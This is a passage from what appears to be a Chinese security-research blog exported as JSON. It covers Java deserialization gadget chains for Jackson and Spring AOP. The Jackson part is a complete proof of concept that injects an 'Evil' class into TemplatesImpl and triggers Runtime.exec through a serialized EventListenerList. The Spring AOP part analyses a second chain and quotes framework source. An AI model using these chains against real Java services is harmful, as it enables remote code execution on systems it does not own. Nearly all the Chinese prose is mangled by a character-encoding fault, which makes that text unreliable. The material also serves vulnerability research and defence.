java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.swing.undo.UndoManager; import javax.swing.event.EventListenerList; import java.lang.reflect.Field; import java.util.Vector; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); UndoManager undo = new UndoManager(); Object[] x = new Object[]{String.class, undo}; EventListenerList listenerList = new EventListenerList(); setFieldValue(listenerList, \u0026#34;listenerList\u0026#34;, x); Vector vector = (Vector) getFieldValue(undo, \u0026#34;edits\u0026#34;); vector.add(node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(listenerList); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static Object getFieldValue(Object obj, String fieldName) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); return field.get(obj); } catch (Exception e) { clazz = clazz.getSuperclass(); } } return null; } } å°±å¯ä»¥åœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºäº†ã€‚ä¸€ä¸ªéå¸¸å¥½çš„è·å–åˆ°çˆ¶ç±»çš„å˜é‡å¹¶è¿›è¡Œä¿®æ”¹æˆ–è€…è®¾ç½®å€¼çš„ä»£ç è®¾è®¡ï¼Œå¤šå­¦ä¹ ã€‚\nâ€”â€”â€”â€”â€”â€”\nå‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/gaorenyusi/p/18411269\nhttps://xz.aliyun.com/news/14924?time__1311=eqUxuDBD0AGQBD7qGNcjDA2A%2BAqY5mKfxx\u0026u_atoken=634642368fa712ac87bbdc71d6c17d07\u0026u_asig=0a472f9217430687398891321e0048\nhttps://xz.aliyun.com/news/14169?u_atoken=cc132e497818eb0c240edb80bb120546\u0026u_asig=0a472f9217430687458091642e0048\nhttps://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/\n","date":"2025-04-07T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E9%93%BE/","title":"jacksonååºåˆ—åŒ–é€šæ€é“¾"},{"content":"SpringAOPé“¾ SpringAOPï¼Œæˆ‘ä»¬åœ¨å­¦ä¹ romeé“¾æ—¶å°±åˆ©ç”¨åˆ°äº†è¿™ä¸ªä¾èµ–çš„HotSwappableTargetSourceç±»ï¼Œä»è€Œå¯ä»¥è°ƒç”¨åˆ°ä»»æ„ç±»çš„equals()æ–¹æ³•å¹¶æ§åˆ¶ä¼ é€’å‚æ•°ã€‚\nä½†æ˜¯æœ€è¿‘çˆ†å‡ºæ¥äº†ä¸€æ¡SpringAOPé“¾ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„æ— å‚æ–¹æ³•ï¼Œä½†æ˜¯åº”è¯¥å¿…é¡»è¦publicæ‰è¡Œï¼Œå¹¶ä¸”è¿™æ¡é“¾å­åªä¾èµ–SpringAOPå’Œaspectjweaverä¸¤ä¸ªä¾èµ–åŒ…ï¼Œè€Œspringbootä¸­çš„spring-boot-starter-aopè‡ªå¸¦åŒ…å«è¿™ä¿©ç±»ï¼Œæ‰€ä»¥å…¶å®å¯ä»¥è®¤ä¸ºåœ¨ä»»ä½•springbooté‡Œéƒ½èƒ½æ‰“ï¼ˆä½†æ˜¯æˆ‘æ²¡æ‰¾åˆ°jdk8ä¸‹çš„ç¬¦åˆçš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥è¿˜æ˜¯ç”¨çš„åˆ†å¼€çš„ç‰ˆæœ¬ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨çš„ä¾èµ–é¡¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-aop \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-aop\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;3.4.4\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-aop\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.19\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;aspectjweaver\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.8\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•ç¯å¢ƒï¼š\nJdk8u71 æ³¨æ„æˆ‘æœ€å¼€å§‹æ˜¯ç”¨çš„é«˜ç‰ˆæœ¬çš„ï¼Œåæ¥æ‰æ”¹æˆä½ç‰ˆæœ¬ï¼Œè‡ªå·±åŒºåˆ†ï¼Œä½†æ˜¯è¿‡ç¨‹ä»¥åŠä»£ç éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ¡é“¾å­åœ¨\u0026lt;=jdk17åº”è¯¥ä¹Ÿèƒ½ç”¨ï¼Œå› ä¸ºjdk17ä¹Ÿèƒ½è°ƒç”¨åå°„ã€‚\nè°ƒè¯•åˆ†æ è¿™é‡Œçš„sinkç‚¹å­˜åœ¨äºorg.springframework.aop.aspectj.AbstractAspectJAdviceç±»çš„invokeAdviceMethodWithGivenArgs()æ–¹æ³•ï¼š è¿™é‡Œçš„this.aspectJAdviceMethodå°±æ˜¯ä¸€ä¸ªå¯æ§çš„å˜é‡ï¼Œç„¶åè¿™é‡Œçš„ReflectionUtils.makeAccessible()æ–¹æ³•å°±æ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºpublicï¼Œä¸æ˜¯çš„è¯å°±ä¼šè°ƒç”¨setAccessible(true)æ¥è®¾ç½®æˆå¯è®¿é—®ï¼š å†å›åˆ°åŸæ¥çš„invokeAdviceMethodWithGivenArgs()æ–¹æ³•ï¼Œåç»­çš„é‡ç‚¹å˜é‡å°±æ˜¯aspectInstanceFactoryï¼Œè¿™ä¸ªå˜é‡è°ƒç”¨çš„getAspectInstance()æ–¹æ³•è¿”å›å€¼å†³å®šäº†ç›¸å¯¹åº”çš„æ–¹æ³•è°ƒç”¨çš„å®ä¾‹ï¼Œè¿™ä¸ªå˜é‡çš„ç±»å‹æ˜¯AspectInstanceFactoryï¼Œè¿™æ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹å®ƒçš„å®ç°ç±»çš„getAspectInstance()æ–¹æ³•çš„è¿”å›å€¼æ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼ŒåŒæ—¶éœ€è¦è¿™ä¸ªç±»æ˜¯å®ç°äº†Serializableæ¥å£ï¼Œè¿™æ ·æ‰å¯ä»¥åœ¨åºåˆ—åŒ–æ—¶åˆ©ç”¨ã€‚\nè¿™é‡Œè‡ªå·±æ‰¾äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰å¯ä»¥å°è¯•åˆ©ç”¨LazySingletonAspectInstanceFactoryDecoratorç±»çš„getAspectInstance()æ–¹æ³•ï¼š è¿™é‡Œæ¶‰åŠåˆ°çš„materializedå˜é‡å¯ä»¥é€šè¿‡åå°„æ¥ä¿®æ”¹ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å®ç°äº†Serializableæ¥å£ï¼Œä½†æ˜¯åœ¨å¯¹å…¶ä»–å˜é‡çš„å®šä¹‰è¿˜éœ€è¦æ‰¾ä¸€ä¸ªç±»æ¥èµ‹å€¼ï¼š\nä¸å¥½åˆ©ç”¨ï¼Œå†çœ‹çœ‹å…¶ä»–ç±»ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªéå¸¸å¥½ç”¨çš„ç±»ï¼šSingletonAspectInstanceFactoryã€‚ä½äºorg.springframework.aop.aspectj.SingletonAspectInstanceFactoryï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\néå¸¸ç¬¦åˆåˆ©ç”¨æ¡ä»¶ï¼Œå¯æ§çš„å‚æ•°ï¼Œå¯ä»¥èµ‹å€¼ä¸ºä»»æ„ç±»ï¼Œç”±æ­¤å¯è¾¾åˆ°æ–¹æ³•è°ƒç”¨çš„å¯¹åº”å®ä¾‹çš„ä»»æ„èµ‹å€¼ã€‚\nå›åˆ°AbstractAspectJAdviceç±»ï¼Œæœ‰å‡ ä¸ªç‚¹éœ€è¦è¯´æ˜ï¼š\nè¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥å®ä¾‹åŒ–åˆ©ç”¨ è¿™ä¸ªç±»å®šä¹‰äº†readObejct()æ–¹æ³•ï¼Œåœ¨å®ä¾‹åŒ–æ—¶è¦ä¿è¯èµ‹å€¼æ­£ç¡®ï¼ŒåŒæ—¶è°ƒç”¨çš„æ˜¯getMethod()æ–¹æ³•ï¼Œåº”è¯¥åªèƒ½è·å–publicç±»å‹çš„æ–¹æ³•å§ï¼š åç»­æ„é€ æ—¶æ³¨æ„ä¸€ä¸‹è¿™é‡Œæåˆ°çš„ç‚¹ã€‚\nâ€”â€”â€”â€”â€”â€”\nç»§ç»­æ¥çœ‹é“¾å­ï¼Œç°åœ¨å°±æ˜¯çœ‹å¯ä»¥ä¼šè°ƒç”¨åˆ°AbstractAspectJAdviceç±»çš„invokeAdviceMethodWithGivenArgs()æ–¹æ³•ï¼ŒåŒæ—¶è¿˜å¯ä»¥çœ‹å“ªé‡Œä¼šè°ƒç”¨åˆ°AbstractAspectJAdviceç±»çš„invokeAdviceMethod()æ–¹æ³•ï¼š ä»é¦–å‘çš„æ–‡ç« çš„é“¾å­æ¥çœ‹ï¼Œè¿™é‡Œæ‰¾åˆ°å¯è§¦å‘ç‚¹åœ¨AspectJAroundAdviceç±»çš„invoke()æ–¹æ³•ï¼š\nçœ‹è¿™ä¸ªç±»ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯AbstractAspectJAdviceï¼Œæ˜¯publicæ–¹æ³•ï¼š å†çœ‹è¿™ä¸ªç±»çš„invoke()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å®ç°äº†è°ƒç”¨invokeAdviceMethod()æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å°è¯•æ¥å…¥å‰é¢åˆ†æçš„åç»­é“¾å­ï¼Œä»è€Œè¾¾åˆ°è°ƒç”¨ä»»æ„ç±»çš„æ–¹æ³•ã€‚\nå†ç»§ç»­å¾€å‰æ‰¾ï¼Œç°åœ¨å°±æ˜¯æƒ³æ€ä¹ˆå¯ä»¥è§¦å‘åˆ°è¿™ä¸ªç±»çš„invoke()æ–¹æ³•ï¼Œç¬¬ä¸€æ­¥æƒ³åˆ°çš„è‚¯å®šæ˜¯é€šè¿‡åŠ¨æ€ä»£ç†æ¥æ‰“ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°ä¼ é€’æœ‰ç‚¹é—®é¢˜ï¼Œä¼¼ä¹æ˜¯ä¸èƒ½ç›´æ¥æ‰“çš„ã€‚é‚£ä¹ˆåœ¨çœ‹å¦‚ä½•è°ƒç”¨åˆ°è¿™ä¸ªç±»çš„invoke()æ–¹æ³•ï¼Œè¿™é‡Œå¾€å‰æ‰¾åˆ°çš„æ–¹æ³•ä¸ºReflectiveMethodInvocationç±»çš„proceed()æ–¹æ³•ï¼š\nåœ¨æ–¹æ³•æœ€åè°ƒç”¨äº†interceptorOrInterceptionAdviceç±»çš„invoke()æ–¹æ³•ï¼Œä»ç±»çš„è°ƒç”¨æ¥çœ‹ï¼Œå¯ä»¥çŸ¥é“MethodInterceptorç±»æ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œæ‰€ä»¥éœ€è¦interceptorOrInterceptionAdviceå®ç°äº†MethodInterceptoræ¥å£ï¼Œå†çœ‹æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„AspectJAroundAdviceç±»ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªç±»æ˜¯å®ç°äº†MethodInterceptoræ¥å£çš„ï¼Œåˆšå¥½å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚ç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆå°†æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„ç±»æ”¾è¿›å»äº†ï¼Œä¸»è¦çš„ä»£ç é€»è¾‘åœ¨äºï¼š\n1 2 Object interceptorOrInterceptionAdvice = this.interceptorsAndDynamicMethodMatchers.get(++this.currentInterceptorIndex); è¿™é‡Œæ¶‰åŠåˆ°çš„ä¸¤ä¸ªå˜é‡ï¼šinterceptorsAndDynamicMethodMatcherså’ŒcurrentInterceptorIndexï¼Œç¬¬ä¸€ä¸ªæ˜¯listç±»å‹ï¼Œç¬¬äºŒä¸ªæ˜¯intç±»å‹ï¼Œå¹¶ä¸”é»˜è®¤æ˜¯-1ï¼Œè€Œç¬¬ä¸€ä¸ªå˜é‡å¯ä»¥åœ¨ç±»åˆå§‹åŒ–æ—¶è¿›è¡Œèµ‹å€¼ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åå°„æ¥ä¿®æ”¹ä¸¤ä¸ªå˜é‡çš„å€¼ã€‚\né‚£ä¹ˆç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆè°ƒç”¨è¿™ä¸ªç±»çš„proceed()æ–¹æ³•äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒReflectiveMethodInvocationç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ç‰¹åˆ«çš„æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ï¼Œåœ¨å‚è€ƒæ–‡ç« ä¸­å­¦åˆ°ä¸€ä¸ªéå¸¸å¥½ç”¨ä¸”ç»å…¸çš„è§£å†³æ–¹æ³•ï¼šæ—¢ç„¶æˆ‘ä»¬æ— æ³•åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä½¿ç”¨ï¼Œé‚£ä¹ˆå°±åªèƒ½ä¾èµ–äºåŠ¨æ€åˆ›å»ºã€‚\nåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ—¢ç„¶éƒ½æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­åŠ¨æ€åˆ›å»ºäº†ï¼Œé‚£ä¹ˆæ˜¯è‚¯å®šæ— æ³•é€šè¿‡åå°„æ¥ä¿®æ”¹ç±»å˜é‡çš„äº†ã€‚é‚£ä¹ˆç°åœ¨æ¥è®¤çœŸçœ‹ä¸€ä¸‹ä»£ç å®ç°é€»è¾‘çš„æ¡ä»¶ï¼š\nå…¶å®åªè¦interceptorsAndDynamicMethodMatchersçš„listä¸­æœ‰æˆ‘ä»¬æƒ³è¦æ”¾è¿›å»çš„AspectJAroundAdviceç±»å®ä¾‹å³å¯ã€‚åŸå› å¦‚ä¸‹ï¼š\nAspectJAroundAdviceç±»æœ¬èº«ä»¥åŠçˆ¶ç±»éƒ½æ²¡æœ‰å®ç°InterceptorAndDynamicMethodMatcherç±»ï¼Œæ‰€ä»¥æ˜¯è‚¯å®šå¯ä»¥è¿›å…¥åˆ°elseè¯­å¥è¿›è¡Œé¢„æœŸçš„invoke()æ–¹æ³•è°ƒç”¨ å…¶æ¬¡åªè¦size()è¿”å›çš„å€¼ä¸ä¸º0ï¼Œä¹Ÿå°±æ˜¯è‡³å°‘æœ‰ä¸€ä¸ªå€¼å°±è¡Œäº†ï¼Œé‚£ä¹ˆè¿™æ ·è¿”å›çš„size-1å°±ä¸ä¼šä¸-1ç›¸åŒï¼ŒåŒæ—¶åœ¨è°ƒç”¨get()è·å–å€¼æ—¶ï¼Œæ˜¯++this.currentInterceptorIndexï¼Œä¹Ÿå°±æ˜¯å…ˆ+1ç„¶åå†è·å–å€¼ï¼Œè¿™é‡Œä¹Ÿå°±å›ä»-1å˜æˆ0ï¼Œä»è€Œè·å–åˆ°listä¸­çš„ç¬¬ä¸€ä¸ªå€¼ã€‚ ç»¼ä¸Šï¼Œæˆ‘ä»¬åªè¦åœ¨åŠ¨æ€åˆ›å»ºReflectiveMethodInvocationç±»æ—¶èƒ½æ§åˆ¶æ„é€ å‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°å³å¯ï¼š\nç»§ç»­å¾€ä¸Šæ‰¾åˆ°çš„JdkDynamicAopProxyç±»ï¼Œè¿™ä¸ªç±»æœ‰åŠ¨æ€åˆ›å»ºReflectiveMethodInvocationçš„åœ°æ–¹ï¼š å¯ä»¥çœ‹åˆ°åœ¨JdkDynamicAopProxyç±»ä¸­æœ‰è°ƒç”¨ï¼Œè¿™ä¸ªç±»åœ¨è§£å†³jacksonä¸ç¨³å®šæ€§çš„é“¾å­ä¹Ÿæ˜¯äº†è§£è¿‡çš„ï¼Œéœ€è¦åå°„æ¥åˆ›å»ºç±»å®ä¾‹ï¼Œè·Ÿè¿›ç›¸å¯¹åº”çš„æ–¹æ³•ï¼š\nå‘ç°å­˜åœ¨äºè¿™ä¸ªç±»çš„invoke()æ–¹æ³•ä¸­ï¼Œä»£ç è°ƒç”¨è¿‡ç¨‹å¦‚ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå°±æ˜¯éœ€è¦æ§åˆ¶è¿™ä¸ªlistç±»å‹çš„chainä¸­æ”¾æœ‰ä¸€ä¸ªAspectJAroundAdviceç±»å®ä¾‹ã€‚\nå†çœ‹JdkDynamicAopProxyç±»ï¼Œè¿™ä¸ªç±»æ˜¯å®ç°äº†Serializableæ¥å£çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥åºåˆ—åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªç±»çš„invoke()çš„å‚æ•°æ¥æ”¶æ˜¯å’ŒåŸºæœ¬çš„åŠ¨æ€ä»£ç†çš„ç‚¹æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å°è¯•åˆ©ç”¨åŠ¨æ€ä»£ç†æ¥è¿›è¡Œè§¦å‘JdkDynamicAopProxyç±»çš„invoke()æ–¹æ³•ã€‚\nç°åœ¨æ¥å…³æ³¨å‚æ•°ä¼ é€’ï¼Œæ€ä¹ˆæ§åˆ¶è¿™ä¸ªchainå˜é‡ï¼Œä¸»è¦æ˜¯å¦‚ä¸‹å‡ ä¸ªå˜é‡éœ€è¦æ§åˆ¶ï¼š\nçœ‹äº†ä¸€ä¸‹ï¼Œè¿™é‡Œçš„advisedå˜é‡è¦æ±‚å¿…é¡»æ˜¯AdvisedSupportç±»å‹ï¼Œè¿™ä¸ªç±»æ˜¯publicï¼Œå¹¶ä¸”è¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯å®ç°äº†Serializableæ¥å£çš„ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚\nç„¶åè¿™é‡Œçš„targetSourceä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œå˜é‡èµ‹å€¼æƒ…å†µå¦‚ä¸‹ï¼š ç›´æ¥å°±æ˜¯è·å–è¿™ä¸ªå˜é‡ï¼Œç„¶åæƒ³è¦æ§åˆ¶targetçš„è¯ï¼Œè¿˜éœ€è¦æ³¨æ„è¿™ä¸ªtargetSourceå˜é‡æ‰€å¯¹åº”çš„å¯¹è±¡æ˜¯å¦æœ‰getTarget()æ–¹æ³•ï¼Œè·Ÿè¿›è¿™ä¸ªå˜é‡çš„èµ‹å€¼ï¼Œå˜é‡å®šä¹‰ä¸ºTargetSourceç±»å‹ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œæ‰€ä»¥éœ€è¦æ‰¾å®ƒçš„å®ç°ç±»æ¥åˆ©ç”¨ï¼Œè‡ªå·±ç®€å•æ‰¾äº†ä¸€ä¸‹ï¼Œè‡³å°‘æœ‰ä¸¤ä¸ªç±»å¯ä»¥åˆ©ç”¨ï¼š\nä¸€ä¸ªæ˜¯AdvisedSupportæœ¬ç±»çš„setTarget()æ–¹æ³•ï¼š è¿™é‡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªSingletonTargetSourceç±»ï¼Œè·Ÿè¿›æƒ…å†µå¦‚ä¸‹ï¼š\néƒ½æ˜¯objectç±»å‹ï¼Œå¹¶ä¸”æ–¹æ³•å¯¹åº”ï¼Œå¯ä»¥åˆ©ç”¨ã€‚\nå¦å¤–ä¸€ä¸ªç±»æ˜¯HotSwappableTargetSourceç±»ï¼š å®ƒçš„getTarget()æ–¹æ³•ï¼š\næ‰€ä»¥ä¹Ÿæ˜¯éå¸¸ç¬¦åˆçš„ã€‚ä¹Ÿè®¸TargetSourceæ¥å£ç±»çš„å®ç°ç±»è¿˜æœ‰ï¼Œè¿™é‡Œä¸å¤šè¯´äº†ã€‚\nç»§ç»­çœ‹æ¡ä»¶ï¼š\nç°åœ¨çš„å…³é”®å°±æ˜¯AdvisedSupportç±»çš„getInterceptorsAndDynamicInterceptionAdvice()æ–¹æ³•ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š å†çœ‹å’Œè¿™é‡Œæœ‰å…³çš„methodCacheå˜é‡ï¼š\nä¸€ä¸ªMapç±»å‹ï¼Œæ ‡æ³¨äº†keyå’Œvalueçš„ç±»å‹ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸å…³é”®çš„ç‚¹ï¼Œè¿™ä¸ªå˜é‡çš„å®šä¹‰ä¸ºtransientï¼Œå¯¼è‡´è¿™ä¸ªå˜é‡ä¸å¯è¢«åºåˆ—åŒ–ã€‚è€Œè¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä»¥åŠreadObject()æ–¹æ³•æœ‰å¯¹è¿™ä¸ªå˜é‡çš„èµ‹å€¼ï¼š\nè¿™ä¸ªConcurrentHashMapç±»å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªMapç±»å‹çš„ç±»ï¼Œå­˜åœ¨put()æ–¹æ³•ç”¨äºæ”¾å…¥é”®å€¼å¯¹ã€‚\nå†ä»”ç»†çœ‹getInterceptorsAndDynamicInterceptionAdvice()æ–¹æ³•ï¼Œç”±äºmethodCacheå˜é‡å£°æ˜ä¸ºtransientï¼Œæ‰€ä»¥åªæœ‰åœ¨cachedçš„è·å–è‚¯å®šä¸ºnullï¼Œé‚£ä¹ˆæ¥çœ‹è¿›å…¥ifæ¡ä»¶çš„ä»£ç ï¼Œè¿™é‡Œä¼šè°ƒç”¨advisorChainFactoryå˜é‡çš„getInterceptorsAndDynamicInterceptionAdvice()æ–¹æ³•ï¼Œè¿™é‡Œçš„advisorChainFactoryå˜é‡é»˜è®¤ä¸ºDefaultAdvisorChainFactoryç±»å®ä¾‹ï¼š\næ‰€ä»¥ä¼šè°ƒç”¨DefaultAdvisorChainFactoryç±»çš„getInterceptorsAndDynamicInterceptionAdvice()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 public List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice( Advised config, Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) { // This is somewhat tricky... We have to process introductions first, // but we need to preserve order in the ultimate list. AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance(); Advisor[] advisors = config.getAdvisors(); List\u0026lt;Object\u0026gt; interceptorList = new ArrayList\u0026lt;\u0026gt;(advisors.length); Class\u0026lt;?\u0026gt; actualClass = (targetClass != null ? targetClass : method.getDeclaringClass()); Boolean hasIntroductions = null; for (Advisor advisor : advisors) { if (advisor instanceof PointcutAdvisor) { // Add it conditionally. PointcutAdvisor pointcutAdvisor = (PointcutAdvisor) advisor; if (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) { MethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher(); boolean match; if (mm instanceof IntroductionAwareMethodMatcher) { if (hasIntroductions == null) { hasIntroductions = hasMatchingIntroductions(advisors, actualClass); } match = ((IntroductionAwareMethodMatcher) mm).matches(method, actualClass, hasIntroductions); } else { match = mm.matches(method, actualClass); } if (match) { MethodInterceptor[] interceptors = registry.getInterceptors(advisor); if (mm.isRuntime()) { // Creating a new object instance in the getInterceptors() method // isn\u0026#39;t a problem as we normally cache created chains. for (MethodInterceptor interceptor : interceptors) { interceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm)); } } else { interceptorList.addAll(Arrays.asList(interceptors)); } } } } else if (advisor instanceof IntroductionAdvisor) { IntroductionAdvisor ia = (IntroductionAdvisor) advisor; if (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } else { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } return interceptorList; } è¿™é‡Œçš„configå°±æ˜¯AdvisedSupportç±»ï¼Œå†çœ‹ä»£ç é€»è¾‘ï¼Œæœ€åè¿”å›çš„æ˜¯interceptorListå˜é‡ï¼Œè€Œå‘è¿™ä¸ªå˜é‡ä¸­æ·»åŠ å€¼çš„æ“ä½œéƒ½æ˜¯å¦‚ä¸‹ï¼š\n1 2 Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); åŸºæœ¬å¯ä»¥è¯´æ˜¯è‚¯å®šä¼šæ·»åŠ çš„ï¼Œæœ€åçš„elseä¹Ÿæ˜¯è¿›è¡Œäº†è¿™ä¸ªæ·»åŠ çš„æ“ä½œï¼Œå¯ä»¥çœ‹ä¸€ä¸‹getInterceptorsçš„åˆ¤æ–­é€»è¾‘ï¼Œregistryçš„è·å–ï¼š\nè°ƒç”¨çš„DefaultAdvisorAdapterRegistryç±»çš„getInterceptors()æ–¹æ³•ï¼š\nå…³é”®çš„å°±æ˜¯ä¸Šè¿°æ–¹æ³•ï¼Œå…ˆçœ‹éœ€è¦åˆ©ç”¨çš„advisorå˜é‡ï¼Œæ˜¯Advisorç±»å‹ï¼Œæ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œæ‰¾äº†ä¸€ä¸‹å®ç°ç±»ï¼Œå‘ç°DefaultIntroductionAdvisorç±»æ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œå®ç°äº†Serializableæ¥å£ï¼Œå¯ä»¥åºåˆ—åŒ–ï¼Œå¹¶ä¸”getAdvice()æ–¹æ³•è¿”å›å®ä¾‹åŒ–ä¼ è¿›å»çš„adviceå˜é‡ï¼š\nï¼ˆå­¦å®Œåæˆ‘å›æ¥çœ‹äº†ä¸€ä¸‹ï¼Œä»ä»£ç 